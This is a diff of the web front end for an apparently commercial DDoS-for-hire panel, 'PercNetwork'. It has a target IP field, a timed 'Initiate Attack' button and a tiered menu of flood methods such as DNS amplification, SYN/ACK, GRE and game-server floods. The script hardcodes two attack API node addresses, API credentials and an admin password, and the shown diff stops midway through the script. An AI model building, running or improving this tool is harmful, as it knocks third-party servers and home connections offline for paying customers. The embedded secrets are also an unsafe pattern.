@@ -1,151 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PercNetwork // Elite Panel</title>
-    <style>
-        :root {
-            --bg-dark: #050505;
-            --glass-bg: rgba(20, 20, 20, 0.6);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --accent-primary: #00ff41;
-            --vip-gold: #ffd700;
-            --error-red: #ff3333;
-            --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --font-mono: 'Courier New', Courier, monospace;
-            --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PercNetwork // Elite Panel</title>
+<style>
+:root{
+    --bg-dark:#050505;
+    --glass-bg:rgba(20,20,20,0.6);
+    --glass-border:rgba(255,255,255,0.1);
+    --accent-primary:#00ff41;
+    --vip-gold:#ffd700;
+    --error-red:#ff3333;
+    --text-main:#fff;
+    --text-muted:#aaa;
+    --font-mono:'Courier New',Courier,monospace;
+    --font-sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{
+    background:var(--bg-dark);
+    color:var(--text-main);
+    font-family:var(--font-sans);
+    min-height:100vh;
+    padding:2.5rem 1rem;
+    position:relative;
+    overflow-x:hidden;
+}
+body::before{
+    content:"";
+    position:fixed;inset:0;
+    background:radial-gradient(ellipse at top,rgba(0,255,65,0.08),transparent 60%);
+    pointer-events:none;z-index:0;
+}
+.grid-overlay{
+    position:fixed;inset:0;
+    background-image:
+        linear-gradient(var(--glass-border) 1px,transparent 1px),
+        linear-gradient(90deg,var(--glass-border) 1px,transparent 1px);
+    background-size:40px 40px;
+    opacity:.08;z-index:0;
+    animation:gridMove 20s linear infinite;
+}
+@keyframes gridMove{to{transform:translate(40px,40px)}}
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+.container{
+    width:100%;max-width:1000px;margin:0 auto;
+    display:flex;flex-direction:column;gap:1.25rem;
+    position:relative;z-index:1;
+}
 
-        body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: var(--font-sans);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow-x: hidden;
-            position: relative;
-        }
+.panel{
+    background:var(--glass-bg);
+    backdrop-filter:blur(12px);
+    -webkit-backdrop-filter:blur(12px);
+    border:1px solid var(--glass-border);
+    border-radius:16px;padding:1.75rem;
+    box-shadow:0 8px 32px rgba(0,0,0,.5);
+    transition:box-shadow .3s ease;
+}
+.panel:hover{box-shadow:0 8px 40px rgba(0,255,65,.05)}
 
-        .grid-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: 
-                linear-gradient(var(--glass-border) 1px, transparent 1px),
-                linear-gradient(90deg, var(--glass-border) 1px, transparent 1px);
-            background-size: 40px 40px;
-            opacity: 0.1; z-index: -1;
-            animation: gridMove 20s linear infinite;
-        }
+.header-section{text-align:center;padding:1.5rem 1.75rem}
+h1{
+    font-family:var(--font-mono);font-size:2rem;letter-spacing:4px;
+    text-transform:uppercase;
+    background:linear-gradient(to right,var(--accent-primary),#fff);
+    -webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;
+    text-shadow:0 0 20px rgba(0,255,65,.2);
+    word-break:break-word;
+}
+.user-status{font-family:var(--font-mono);color:var(--text-muted);font-size:.85rem;margin-top:.5rem}
+.badge-admin{color:var(--error-red);font-weight:bold;text-transform:uppercase}
+.badge-vip{color:var(--vip-gold);font-weight:bold;text-transform:uppercase}
+.badge-free{color:var(--text-muted);font-weight:bold;text-transform:uppercase}
+.badge-expired{color:var(--error-red);font-weight:bold;text-transform:uppercase;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 
-        @keyframes gridMove {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(40px, 40px); }
-        }
+#authPanel{max-width:460px;margin:0 auto;width:100%}
 
-        .container {
-            width: 90%; max-width: 1200px;
-            display: grid; grid-template-columns: 3fr 1fr; gap: 2rem;
-            perspective: 1000px;
-        }
+h2{font-family:var(--font-mono);font-size:1.1rem;letter-spacing:1px}
 
-        .panel {
-            background: var(--glass-bg);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px; padding: 2rem;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
+.form-group{margin-bottom:1.25rem}
+label{display:block;margin-bottom:.4rem;font-family:var(--font-mono);font-size:.75rem;color:var(--accent-primary);text-transform:uppercase;letter-spacing:1px}
 
-        .header-section { grid-column: span 2; text-align: center; margin-bottom: 1rem; }
-        h1 {
-            font-family: var(--font-mono); font-size: 2.5rem; letter-spacing: 4px;
-            text-transform: uppercase;
-            background: linear-gradient(to right, var(--accent-primary), #fff);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
-        }
+input[type="text"],input[type="password"],input[type="number"],select{
+    width:100%;background:rgba(0,0,0,.4);
+    border:1px solid var(--glass-border);color:var(--text-main);
+    padding:11px 12px;font-family:var(--font-mono);font-size:.9rem;
+    border-radius:8px;outline:none;transition:border-color .2s,box-shadow .2s;
+}
+input:focus,select:focus{border-color:var(--accent-primary);box-shadow:0 0 0 3px rgba(0,255,65,.12)}
+select{cursor:pointer;appearance:none;-webkit-appearance:none;
+    background-image:linear-gradient(45deg,transparent 50%,var(--text-muted) 50%),
+                     linear-gradient(135deg,var(--text-muted) 50%,transparent 50%);
+    background-position:calc(100% - 18px) 50%,calc(100% - 13px) 50%;
+    background-size:5px 5px,5px 5px;background-repeat:no-repeat;padding-right:32px}
 
-        .user-status { font-family: var(--font-mono); color: var(--text-muted); font-size: 0.9rem; margin-top: 0.5rem; }
-        .badge-admin { color: var(--error-red); font-weight: bold; text-transform: uppercase; }
-        .badge-vip { color: var(--vip-gold); font-weight: bold; text-transform: uppercase; }
-        .badge-free { color: var(--text-muted); font-weight: bold; text-transform: uppercase; }
-        .badge-expired { color: var(--error-red); font-weight: bold; text-transform: uppercase; animation: pulse 2s infinite; }
+button{
+    width:100%;padding:13px;background:linear-gradient(135deg,var(--accent-primary),#00cc33);
+    color:#000;border:none;border-radius:8px;font-family:var(--font-mono);
+    font-weight:bold;text-transform:uppercase;cursor:pointer;
+    transition:transform .15s,box-shadow .15s;letter-spacing:1px;font-size:.85rem;
+}
+button:hover{transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,255,65,.35)}
+button:active{transform:translateY(0)}
+button:disabled{opacity:.6;cursor:not-allowed;transform:none;box-shadow:none}
+button.secondary{background:transparent;border:1px solid var(--glass-border);color:var(--text-main)}
+button.secondary:hover{border-color:var(--accent-primary);box-shadow:none}
+button.danger{background:linear-gradient(135deg,var(--error-red),#cc0000);color:#fff}
+button.danger:hover{box-shadow:0 6px 18px rgba(255,51,51,.35)}
 
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+.method-list{
+    display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));
+    gap:8px;max-height:320px;overflow-y:auto;padding-right:6px;
+}
+.method-card{
+    display:flex;flex-direction:column;justify-content:space-between;
+    background:rgba(0,0,0,.3);border:1px solid var(--glass-border);
+    padding:10px;border-radius:8px;cursor:pointer;
+    transition:border-color .15s,background .15s;
+}
+.method-card:hover{border-color:var(--accent-primary);background:rgba(0,255,65,.05)}
+.method-card.selected{border-color:var(--accent-primary);background:rgba(0,255,65,.1);box-shadow:inset 0 0 10px rgba(0,255,65,.15)}
+.method-card.disabled{opacity:.35;pointer-events:none}
+.method-name{font-family:var(--font-mono);font-weight:bold;font-size:.85rem;margin-bottom:4px}
+.method-desc{font-size:.7rem;color:var(--text-muted);line-height:1.3}
+.tier-tag{font-size:.6rem;padding:2px 6px;border-radius:4px;margin-top:6px;align-self:flex-start;font-weight:bold;letter-spacing:.5px}
+.tier-default{background:#333;color:#ccc}
+.tier-vip{background:var(--vip-gold);color:#000}
 
-        .form-group { margin-bottom: 1.5rem; }
-        label { display: block; margin-bottom: 0.5rem; font-family: var(--font-mono); font-size: 0.85rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; }
-        
-        input[type="text"], input[type="password"], input[type="number"] {
-            width: 100%; background: rgba(0, 0, 0, 0.4); border: 1px solid var(--glass-border);
-            color: var(--text-main); padding: 12px; font-family: var(--font-mono);
-            border-radius: 8px; outline: none; transition: all 0.3s;
-        }
-        input:focus { border-color: var(--accent-primary); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
+.admin-panel{display:none;border-top:1px solid var(--glass-border)}
+.user-table{width:100%;border-collapse:collapse;font-family:var(--font-mono);font-size:.8rem}
+.user-table th,.user-table td{text-align:left;padding:8px 6px;border-bottom:1px solid var(--glass-border);vertical-align:middle}
+.user-table th{color:var(--text-muted);font-weight:normal;font-size:.7rem;text-transform:uppercase;letter-spacing:1px}
+.user-actions button{width:auto;padding:5px 10px;font-size:.7rem;margin-right:4px}
 
-        button {
-            width: 100%; padding: 14px; background: linear-gradient(135deg, var(--accent-primary), #00cc33);
-            color: #000; border: none; border-radius: 8px; font-family: var(--font-mono);
-            font-weight: bold; text-transform: uppercase; cursor: pointer; transition: all 0.2s; letter-spacing: 1px;
-        }
-        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4); }
-        button.secondary { background: transparent; border: 1px solid var(--glass-border); color: var(--text-main); }
-        button.danger { background: linear-gradient(135deg, var(--error-red), #cc0000); color: white; }
+.timer-section{margin-top:1.5rem;text-align:center;display:none}
+.timer-display{font-size:3rem;font-family:var(--font-mono);color:var(--error-red);text-shadow:0 0 20px rgba(255,51,51,.5);margin-bottom:10px;line-height:1}
+.progress-bar-container{width:100%;height:8px;background:#1a1a1a;border-radius:4px;overflow:hidden}
+.progress-bar-fill{height:100%;width:0;background:linear-gradient(90deg,var(--error-red),var(--vip-gold));transition:width .1s linear}
 
-        .method-list {
-            display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 10px; max-height: 300px; overflow-y: auto; padding-right: 5px;
-        }
-        .method-card {
-            background: rgba(0, 0, 0, 0.3); border: 1px solid var(--glass-border);
-            padding: 10px; border-radius: 8px; cursor: pointer; transition: all 0.2s;
-            display: flex; flex-direction: column; justify-content: space-between;
-        }
-        .method-card:hover { border-color: var(--accent-primary); background: rgba(0, 255, 65, 0.05); }
-        .method-card.selected { border-color: var(--accent-primary); background: rgba(0, 255, 65, 0.1); box-shadow: inset 0 0 10px rgba(0, 255, 65, 0.2); }
-        .method-name { font-family: var(--font-mono); font-weight: bold; font-size: 0.9rem; margin-bottom: 4px; }
-        .method-desc { font-size: 0.7rem; color: var(--text-muted); }
-        .tier-tag { font-size: 0.6rem; padding: 2px 6px; border-radius: 4px; margin-top: 5px; align-self: flex-start; font-weight: bold; }
-        .tier-default { background: #333; color: #ccc; }
-        .tier-vip { background: var(--vip-gold); color: #000; }
+.log-area{
+    background:rgba(0,0,0,.55);border:1px solid var(--glass-border);
+    border-radius:8px;height:180px;overflow-y:auto;padding:10px 12px;
+    font-family:var(--font-mono);font-size:.75rem;color:var(--text-muted);margin-top:1rem;
+}
+.log-entry{margin-bottom:3px;line-height:1.4}
+.log-normal{color:var(--text-muted)}
+.log-success{color:var(--accent-primary)}
+.log-error{color:var(--error-red)}
+.log-info{color:var(--vip-gold)}
 
-        .admin-panel { display: none; border-top: 1px solid var(--glass-border); margin-top: 2rem; padding-top: 1rem; }
-        .user-table { width: 100%; border-collapse: collapse; font-family: var(--font-mono); font-size: 0.8rem; }
-        .user-table th, .user-table td { text-align: left; padding: 8px; border-bottom: 1px solid var(--glass-border); }
-        .user-actions button { width: auto; padding: 4px 8px; font-size: 0.7rem; margin-right: 5px; }
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:#000}
+::-webkit-scrollbar-thumb{background:#2a2a2a;border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:var(--accent-primary)}
 
-        .timer-section { margin-top: 2rem; text-align: center; display: none; }
-        .timer-display { font-size: 3rem; font-family: var(--font-mono); color: var(--error-red); text-shadow: 0 0 20px rgba(255, 51, 51, 0.5); margin-bottom: 10px; }
-        .progress-bar-container { width: 100%; height: 8px; background: #222; border-radius: 4px; overflow: hidden; }
-        .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--error-red), var(--vip-gold)); transition: width 0.1s linear; }
-
-        .log-area {
-            background: rgba(0, 0, 0, 0.5); border: 1px solid var(--glass-border);
-            border-radius: 8px; height: 200px; overflow-y: auto; padding: 10px;
-            font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted); margin-top: 1rem;
-        }
-        .log-entry { margin-bottom: 4px; }
-        .log-success { color: var(--accent-primary); }
-        .log-error { color: var(--error-red); }
-        .log-info { color: var(--vip-gold); }
-
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: #333; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--accent-primary); }
-
-        @media (max-width: 768px) {
-            .container { grid-template-columns: 1fr; }
-            .header-section { grid-column: span 1; }
-        }
-    </style>
+@media(max-width:600px){
+    body{padding:1.25rem .75rem}
+    .panel{padding:1.25rem}
+    h1{font-size:1.4rem;letter-spacing:2px}
+    .method-list{grid-template-columns:1fr 1fr}
+    .user-table{font-size:.7rem}
+}
+</style>
 </head>
 <body>
 
@@ -157,10 +178,8 @@
         <div class="user-status" id="statusDisplay">Loading Database...</div>
     </div>
 
-    <!-- Login/Register Section -->
     <div class="panel" id="authPanel">
-        <h2 style="margin-bottom: 1rem; font-family: var(--font-mono); color: var(--accent-primary);">Authentication</h2>
-        
+        <h2 style="margin-bottom:1rem;color:var(--accent-primary)">Authentication</h2>
         <div class="form-group">
             <label>Username</label>
             <input type="text" id="loginUser" placeholder="Enter username">
@@ -169,11 +188,9 @@
             <label>Password</label>
             <input type="password" id="loginPass" placeholder="Enter password">
         </div>
-        
         <button onclick="handleLogin()">Login</button>
-        <button class="secondary" onclick="toggleRegister()" style="margin-top: 10px;">Create Account</button>
-        
-        <div id="registerForm" style="display:none; margin-top: 1rem; border-top: 1px solid var(--glass-border); padding-top: 1rem;">
+        <button class="secondary" onclick="toggleRegister()" style="margin-top:10px">Create Account</button>
+        <div id="registerForm" style="display:none;margin-top:1rem;border-top:1px solid var(--glass-border);padding-top:1rem">
             <div class="form-group">
                 <label>New Username</label>
                 <input type="text" id="regUser" placeholder="Choose username">
@@ -190,13 +207,11 @@
         </div>
     </div>
 
-    <!-- Attack Dashboard -->
-    <div class="panel" id="dashboardPanel" style="display:none;">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 1rem;">
-            <h2 style="font-family: var(--font-mono); color: var(--accent-primary);">Attack Vector</h2>
-            <button class="danger" onclick="logout()" style="width:auto; padding: 5px 10px; font-size: 0.8rem;">Logout</button>
+    <div class="panel" id="dashboardPanel" style="display:none">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem">
+            <h2 style="color:var(--accent-primary)">Attack Vector</h2>
+            <button class="danger" onclick="logout()" style="width:auto;padding:6px 12px;font-size:.75rem">Logout</button>
         </div>
-
         <div class="form-group">
             <label>Target IP / Host</label>
             <input type="text" id="target" placeholder="192.168.1.1">
@@ -209,508 +224,404 @@
             <label>Duration (Max 60s)</label>
             <input type="number" id="duration" value="30" max="60">
         </div>
-
         <div class="form-group">
             <label>Select Method</label>
             <div class="method-list" id="methodContainer"></div>
         </div>
-
-        <button id="attackBtn" onclick="launchAttack()">INITIATE ATTACK</button>
-
+        <button id="attackBtn" onclick="launchAttack()">Initiate Attack</button>
         <div class="timer-section" id="timerSection">
-            <div class="timer-label">Time Remaining</div>
             <div class="timer-display" id="timerDisplay">00:00</div>
             <div class="progress-bar-container">
                 <div class="progress-bar-fill" id="progressBar"></div>
             </div>
         </div>
-
         <div class="log-area" id="consoleLog">
-            <div class="log-entry">> System initialized...</div>
+            <div class="log-entry log-normal">> System initialized...</div>
         </div>
     </div>
 
-    <!-- Admin Panel -->
     <div class="panel admin-panel" id="adminPanel">
-        <h2 style="font-family: var(--font-mono); color: var(--error-red); margin-bottom: 1rem;">Administrator Control</h2>
-        
+        <h2 style="color:var(--error-red);margin-bottom:1rem">Administrator Control</h2>
         <div class="form-group">
             <label>Create User</label>
-            <div style="display:flex; gap:10px;">
+            <div style="display:flex;gap:8px;margin-bottom:8px">
                 <input type="text" id="admNewUser" placeholder="Username">
-                <select id="admNewTier" style="background: rgba(0,0,0,0.4); color:white; border:1px solid var(--glass-border); padding:10px; border-radius:8px;">
+                <select id="admNewTier" style="max-width:120px">
                     <option value="FREE">Free</option>
                     <option value="VIP">VIP</option>
                     <option value="ADMIN">Admin</option>
                 </select>
             </div>
-            <input type="password" id="admNewPass" placeholder="Password" style="margin-top:5px;">
-            <div class="form-group" style="margin-top:5px;">
-                <label>Days (-1 for Infinite)</label>
-                <input type="number" id="admNewDays" value="-1">
-            </div>
-            <button onclick="adminCreateUser()" style="margin-top:10px;">Create</button>
+            <input type="password" id="admNewPass" placeholder="Password" style="margin-bottom:8px">
+            <input type="number" id="admNewDays" value="-1" placeholder="Days (-1 = infinite)">
+            <button onclick="adminCreateUser()" style="margin-top:10px">Create</button>
         </div>
-
-        <hr style="border-color: var(--glass-border); margin: 1rem 0;">
-
-        <label>User Management</label>
-        <table class="user-table">
-            <thead>
-                <tr>
-                    <th>User</th>
-                    <th>Tier</th>
-                    <th>Expires</th>
-                    <th>Status</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody id="userTableBody"></tbody>
-        </table>
+        <hr style="border-color:var(--glass-border);margin:1.25rem 0">
+        <label style="margin-bottom:.6rem">User Management</label>
+        <div style="overflow-x:auto">
+            <table class="user-table">
+                <thead>
+                    <tr><th>User</th><th>Tier</th><th>Expires</th><th>Status</th><th>Actions</th></tr>
+                </thead>
+                <tbody id="userTableBody"></tbody>
+            </table>
+        </div>
     </div>
 </div>
 
 <script>
-    // API Configuration (Dual Node with Failover)
-    const API_NODES = [
-        "http://191.217.203.207:9000/api/attack",
-        "http://78.17.212.44:9000/api/attack"
-    ];
-    
-    const API_USER = "twinkfrix";
-    const API_SECRET = "19012hack";
+const API_NODES=[
+    "http://191.217.203.207:9000/api/attack",
+    "http://78.17.212.44:9000/api/attack"
+];
+const API_USER="twinkfrix";
+const API_SECRET="19012hack";
+const ADMIN_USER="admin";
+const ADMIN_PASS="362gdd8h3";
 
-    // Local Storage Config
-    const ADMIN_USER = 'admin';
-    const ADMIN_PASS = '362gdd8h3';
+let currentUser=null;
+let usersDB={};
 
-    let currentUser = null;
-    let usersDB = {};
-    
-    // Load DB from file (PercNetwork Format: user:pass:days)
-    async function initDB() {
-        try {
-            const response = await fetch('database.txt');
-            if (!response.ok) throw new Error("DB file not found");
-            const text = await response.text();
-            const lines = text.split('\n');
-            
-            usersDB = {}; // Reset
-            
-            lines.forEach(line => {
-                const parts = line.trim().split(':');
-                if (parts.length >= 3) {
-                    const username = parts[0];
-                    const password = parts[1];
-                    const daysStr = parts[2];
-                    const days = parseInt(daysStr);
-                    
-                    // Calculate expiry
-                    let expiry = null;
-                    if (days !== -1) {
-                        const now = new Date();
-                        now.setDate(now.getDate() + days);
-                        expiry = now.getTime();
-                    }
-
-                    usersDB[username] = { 
-                        pass: password, 
-                        tier: 'VIP', // Default to VIP for imported accounts or detect from name? Let's stick to VIP for simplicity or parse name.
-                        banned: false,
-                        expiry: expiry
-                    };
+async function initDB(){
+    try{
+        const r=await fetch('database.txt');
+        if(!r.ok)throw new Error("DB file not found");
+        const text=await r.text();
+        usersDB={};
+        text.split('\n').forEach(line=>{
+            const p=line.trim().split(':');
+            if(p.length>=3){
+                const days=parseInt(p[2]);
+                let expiry=null;
+                if(days!==-1){
+                    const now=new Date();
+                    now.setDate(now.getDate()+days);
+                    expiry=now.getTime();
                 }
-            });
-
-            // Ensure admin exists
-            if (!usersDB[ADMIN_USER]) {
-                usersDB[ADMIN_USER] = { pass: ADMIN_PASS, tier: 'ADMIN', banned: false, expiry: null };
-                log("Admin account created in memory.", "info");
+                usersDB[p[0]]={pass:p[1],tier:'VIP',banned:false,expiry:expiry};
             }
-            saveDB(); 
-        } catch (e) {
-            console.error("Failed to load database.txt, using fallback/local", e);
-            const stored = localStorage.getItem('percnetwork_users');
-            if (stored) {
-                usersDB = JSON.parse(stored);
-            } else {
-                usersDB[ADMIN_USER] = { pass: ADMIN_PASS, tier: 'ADMIN', banned: false, expiry: null };
-                saveDB();
-            }
+        });
+        if(!usersDB[ADMIN_USER]){
+            usersDB[ADMIN_USER]={pass:ADMIN_PASS,tier:'ADMIN',banned:false,expiry:null};
         }
-        renderMethods();
-        checkSession();
-        document.getElementById('statusDisplay').innerText = "Database Loaded";
-    }
-
-    function saveDB() {
-        localStorage.setItem('percnetwork_users', JSON.stringify(usersDB));
-    }
-
-    const methods = [
-        { id: 'udp-big', name: 'udp-big', desc: 'Mass Valid Randomized UDP Data', tier: 'DEFAULT' },
-        { id: 'home', name: 'home', desc: 'Udp/Tcp Flood (Home)', tier: 'DEFAULT' },
-        { id: 'dns', name: 'dns', desc: 'DNS Amplification', tier: 'DEFAULT' },
-        { id: 'udpbypass', name: 'udpbypass', desc: 'Small PPS Bypass', tier: 'VIP' },
-        { id: 'pps', name: 'pps', desc: 'Rapid Random Packets', tier: 'VIP' },
-        { id: 'udp-gbps', name: 'udp-gbps', desc: 'Generic UDP Flooder', tier: 'VIP' },
-        { id: 'udpplain', name: 'udpplain', desc: 'High GB/s & PPS', tier: 'VIP' },
-        { id: 'openvpn', name: 'openvpn', desc: 'OpenVPN Simulation', tier: 'VIP' },
-        { id: 'tcp', name: 'tcp', desc: 'TCP Session Handshake', tier: 'DEFAULT' },
-        { id: 'tcp-ack', name: 'tcp-ack', desc: 'Proper ACK Packets', tier: 'DEFAULT' },
-        { id: 'tcp-syn', name: 'tcp-syn', desc: 'Proper SYN Packets', tier: 'DEFAULT' },
-        { id: 'socket', name: 'socket', desc: 'Stateful TCP Connections', tier: 'DEFAULT' },
-        { id: 'ovh', name: 'ovh', desc: 'OVH GRE/IPIP Flood', tier: 'VIP' },
-        { id: 'ssh', name: 'ssh', desc: 'SSH Flood Emulation', tier: 'VIP' },
-        { id: 'tcpbypass', name: 'tcpbypass', desc: 'Socket Flood Random Bytes', tier: 'VIP' },
-        { id: 'tcpboom', name: 'tcpboom', desc: 'High TCP Flood Bypass', tier: 'VIP' },
-        { id: 'fivem', name: 'fivem', desc: 'FiveM Ping & Sync', tier: 'VIP' },
-        { id: 'raknet', name: 'raknet', desc: 'Optimized UDP Game', tier: 'VIP' },
-        { id: 'discord', name: 'discord', desc: 'Discord Gateway API', tier: 'DEFAULT' },
-        { id: 'game', name: 'game', desc: 'Generic Game Socket', tier: 'DEFAULT' },
-        { id: 'minecraft', name: 'minecraft', desc: 'Minecraft TCP Socket', tier: 'DEFAULT' },
-        { id: 'browser', name: 'browser', desc: 'Headless Browser', tier: 'VIP' },
-        { id: 'bypass', name: 'bypass', desc: 'HTTP/2 Enhanced Headers', tier: 'VIP' },
-        { id: 'https', name: 'https', desc: 'HTTP/1.1 & HTTP/2', tier: 'DEFAULT' },
-        { id: 'tls', name: 'tls', desc: 'TLS Handshake Validation', tier: 'DEFAULT' }
-    ];
-
-    let selectedMethodId = 'udp-big';
-
-    const els = {
-        authPanel: document.getElementById('authPanel'),
-        dashPanel: document.getElementById('dashboardPanel'),
-        adminPanel: document.getElementById('adminPanel'),
-        status: document.getElementById('statusDisplay'),
-        methodContainer: document.getElementById('methodContainer'),
-        logArea: document.getElementById('consoleLog'),
-        timerSec: document.getElementById('timerSection'),
-        timerDisp: document.getElementById('timerDisplay'),
-        progBar: document.getElementById('progressBar'),
-        userTable: document.getElementById('userTableBody')
-    };
-
-    window.onload = () => {
-        initDB();
-    };
-
-    function checkSession() {
-        const savedUser = sessionStorage.getItem('pn_user');
-        if (savedUser && usersDB[savedUser]) {
-            const userData = usersDB[savedUser];
-            // Check Expiry
-            if (userData.expiry && Date.now() > userData.expiry) {
-                log("Account expired.", "error");
-                return;
-            }
-            loginSuccess(savedUser);
-        }
-    }
-
-    function toggleRegister() {
-        const regForm = document.getElementById('registerForm');
-        regForm.style.display = regForm.style.display === 'none' ? 'block' : 'none';
-    }
-
-    function handleLogin() {
-        const u = document.getElementById('loginUser').value.trim();
-        const p = document.getElementById('loginPass').value;
-
-        if (!u || !p) return log("Fill all fields.", "error");
-
-        if (usersDB[u]) {
-            const userData = usersDB[u];
-            if (userData.pass !== p) return log("Invalid credentials.", "error");
-            if (userData.banned) return log("Account is banned.", "error");
-            
-            // Check Expiry
-            if (userData.expiry && Date.now() > userData.expiry) {
-                return log("Account has expired.", "error");
-            }
-            
-            loginSuccess(u);
-        } else {
-            log("User not found.", "error");
-        }
-    }
-
-    function handleRegister() {
-        const u = document.getElementById('regUser').value.trim();
-        const p = document.getElementById('regPass').value;
-        const d = parseInt(document.getElementById('regDays').value);
-
-        if (!u || !p) return log("Fill all fields.", "error");
-        if (usersDB[u]) return log("User exists.", "error");
-
-        let expiry = null;
-        if (d !== -1) {
-            const now = new Date();
-            now.setDate(now.getDate() + d);
-            expiry = now.getTime();
-        }
-
-        usersDB[u] = { pass: p, tier: 'FREE', banned: false, expiry: expiry };
         saveDB();
-        log("Account created! Please login.", "success");
-        toggleRegister();
-    }
-
-    function loginSuccess(username) {
-        currentUser = username;
-        sessionStorage.setItem('pn_user', username);
-        
-        const userData = usersDB[username];
-        
-        let badgeClass = 'badge-free';
-        if (userData.tier === 'VIP') badgeClass = 'badge-vip';
-        if (userData.tier === 'ADMIN') badgeClass = 'badge-admin';
-        
-        let expiryText = "Infinite";
-        if (userData.expiry) {
-            const date = new Date(userData.expiry);
-            expiryText = date.toLocaleDateString();
-            if (Date.now() > userData.expiry) {
-                badgeClass = 'badge-expired';
-                expiryText += " (EXPIRED)";
-            }
+    }catch(e){
+        console.error(e);
+        const stored=localStorage.getItem('percnetwork_users');
+        if(stored){usersDB=JSON.parse(stored)}
+        else{
+            usersDB[ADMIN_USER]={pass:ADMIN_PASS,tier:'ADMIN',banned:false,expiry:null};
+            saveDB();
         }
+    }
+    renderMethods();
+    const restored=checkSession();
+    if(!restored)document.getElementById('statusDisplay').innerText="Not authenticated";
+}
 
-        els.status.innerHTML = `Logged in as: <span class="${badgeClass}">${username}</span> <small>[${expiryText}]</small>`;
-        
-        els.authPanel.style.display = 'none';
-        els.dashPanel.style.display = 'block';
-        
-        if (userData.tier === 'ADMIN') {
-            els.adminPanel.style.display = 'block';
-            renderUserTable();
-        } else {
-            els.adminPanel.style.display = 'none';
+function saveDB(){localStorage.setItem('percnetwork_users',JSON.stringify(usersDB))}
+
+const methods=[
+    {id:'udp-big',name:'udp-big',desc:'Mass Valid Randomized UDP Data',tier:'DEFAULT'},
+    {id:'home',name:'home',desc:'Udp/Tcp Flood (Home)',tier:'DEFAULT'},
+    {id:'dns',name:'dns',desc:'DNS Amplification',tier:'DEFAULT'},
+    {id:'udpbypass',name:'udpbypass',desc:'Small PPS Bypass',tier:'VIP'},
+    {id:'pps',name:'pps',desc:'Rapid Random Packets',tier:'VIP'},
+    {id:'udp-gbps',name:'udp-gbps',desc:'Generic UDP Flooder',tier:'VIP'},
+    {id:'udpplain',name:'udpplain',desc:'High GB/s & PPS',tier:'VIP'},
+    {id:'openvpn',name:'openvpn',desc:'OpenVPN Simulation',tier:'VIP'},
+    {id:'tcp',name:'tcp',desc:'TCP Session Handshake',tier:'DEFAULT'},
+    {id:'tcp-ack',name:'tcp-ack',desc:'Proper ACK Packets',tier:'DEFAULT'},
+    {id:'tcp-syn',name:'tcp-syn',desc:'Proper SYN Packets',tier:'DEFAULT'},
+    {id:'socket',name:'socket',desc:'Stateful TCP Connections',tier:'DEFAULT'},
+    {id:'ovh',name:'ovh',desc:'OVH GRE/IPIP Flood',tier:'VIP'},
+    {id:'ssh',name:'ssh',desc:'SSH Flood Emulation',tier:'VIP'},
+    {id:'tcpbypass',name:'tcpbypass',desc:'Socket Flood Random Bytes',tier:'VIP'},
+    {id:'tcpboom',name:'tcpboom',desc:'High TCP Flood Bypass',tier:'VIP'},
+    {id:'fivem',name:'fivem',desc:'FiveM Ping & Sync',tier:'VIP'},
+    {id:'raknet',name:'raknet',desc:'Optimized UDP Game',tier:'VIP'},
+    {id:'discord',name:'discord',desc:'Discord Gateway API',tier:'DEFAULT'},
+    {id:'game',name:'game',desc:'Generic Game Socket',tier:'DEFAULT'},
+    {id:'minecraft',name:'minecraft',desc:'Minecraft TCP Socket',tier:'DEFAULT'},
+    {id:'browser',name:'browser',desc:'Headless Browser',tier:'VIP'},
+    {id:'bypass',name:'bypass',desc:'HTTP/2 Enhanced Headers',tier:'VIP'},
+    {id:'https',name:'https',desc:'HTTP/1.1 & HTTP/2',tier:'DEFAULT'},
+    {id:'tls',name:'tls',desc:'TLS Handshake Validation',tier:'DEFAULT'}
+];
+
+let selectedMethodId='udp-big';
+
+const els={
+    authPanel:document.getElementById('authPanel'),
+    dashPanel:document.getElementById('dashboardPanel'),
+    adminPanel:document.getElementById('adminPanel'),
